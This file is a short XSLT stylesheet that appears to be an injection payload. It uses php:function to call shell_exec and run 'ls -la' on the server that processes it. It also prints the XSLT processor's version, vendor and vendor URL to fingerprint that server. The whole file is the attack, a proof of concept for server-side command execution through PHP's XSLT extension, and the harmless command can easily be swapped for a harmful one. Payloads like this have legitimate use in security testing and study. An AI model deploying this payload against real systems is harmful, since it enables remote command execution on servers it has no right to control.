<xsl:stylesheet xmlns:xsl = "http://www.w3.org/1999/XSL/Transform" version = "1.0" >
	<xsl:output method = "text" />

		<xsl:template match = "/" >
			<xsl:value-of select="php:function('shell_exec','ls -la')" />
			<xsl:text >	Version :  </xsl:text>
			<xsl:value-of select = "system-property('xsl:version')" />
			<xsl:text >	Vendor :  </xsl:text>
				<xsl:value-of select = "system-property('xsl:vendor')" />
			<xsl:text >	URL :  </xsl:text>
			<xsl:value-of select = "system-property('xsl:vendor-url')" />
		</xsl:template>
</xsl:stylesheet>
